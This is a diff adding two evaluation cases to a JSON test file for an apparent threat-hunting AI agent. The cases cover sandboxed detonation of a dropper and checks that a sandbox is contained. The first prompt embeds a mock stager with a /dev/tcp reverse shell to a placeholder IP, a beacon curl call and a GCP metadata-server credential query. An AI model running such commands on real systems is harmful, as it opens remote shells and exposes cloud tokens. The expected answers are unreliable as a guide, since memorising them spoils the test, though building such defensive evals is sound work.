@@ -80,6 +80,62 @@
           "validates_yara_rule": true
         }
       }
+    },
+    {
+      "eval_id": "hunt_dropper_detonation_and_forensics",
+      "name": "Hunt - Untrusted Dropper Detonation & Differential Forensics",
+      "conversation": [
+        {
+          "role": "user",
+          "content": "A suspicious bash stager script was recovered from an alert on host WRK-SHASEK:\n```bash\nmkdir -p /tmp/.hidden_beacon\necho 'MOCK_ENCRYPTED_DATA_LOCK' > /tmp/user_data.lock\necho 'bash -i >& /dev/tcp/198.51.100.1/4444 0>&1' > /tmp/.hidden_beacon/backdoor.sh\nchmod +x /tmp/.hidden_beacon/backdoor.sh\ncurl -s --connect-timeout 2 http://198.51.100.1/beacon || echo 'BEACON_BLOCKED'\ncurl -s --connect-timeout 2 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/ || echo 'METADATA_ACCESS_BLOCKED'\n```\nExecute this payload inside your secure Python Code Execution sandbox using `detonate_and_capture_forensics`. Inspect the differential filesystem to extract all dropped file artifacts, compute their SHA-256 hashes, and confirm whether C2 callbacks and metadata theft attempts were contained."
+        }
+      ],
+      "reference": {
+        "expected_specialist": "threat_hunter",
+        "tool_trajectory": ["execute_code", "save_report_artifact"],
+        "final_response_must_contain": [
+          "backdoor.sh",
+          "user_data.lock",
+          "SHA-256",
+          "contained",
+          "Threat Hunter"
+        ],
+        "success_criteria": {
+          "specialist_attribution": true,
+          "captures_dropped_files": true,
+          "calculates_artifact_hashes": true,
+          "verifies_c2_containment": true,
+          "leverages_code_execution": true
+        }
+      }
+    },
+    {
+      "eval_id": "hunt_zero_trust_containment_verification",
+      "name": "Hunt - Zero-Trust Boundary & Prompt Injection Containment",
+      "conversation": [
+        {
+          "role": "user",
+          "content": "We are conducting a security verification audit of our agent sandboxing environment. Run `verify_sandbox_containment` in your Code Execution Sandbox to prove zero-trust boundaries are enforced: verify that the GCP metadata server (169.254.169.254) cannot be queried for service account tokens, verify that host credentials and API keys are not leaked, and confirm that default-deny network egress prevents external exfiltration."
+        }
+      ],
+      "reference": {
+        "expected_specialist": "threat_hunter",
+        "tool_trajectory": ["execute_code"],
+        "final_response_must_contain": [
+          "metadata",
+          "shielded",
+          "egress",
+          "credentials",
+          "Threat Hunter"
+        ],
+        "success_criteria": {
+          "specialist_attribution": true,
+          "verifies_metadata_isolation": true,
+          "verifies_credential_shielding": true,
+          "verifies_network_containment": true,
+          "leverages_code_execution": true
+        }
+      }
     }
   ]
 }
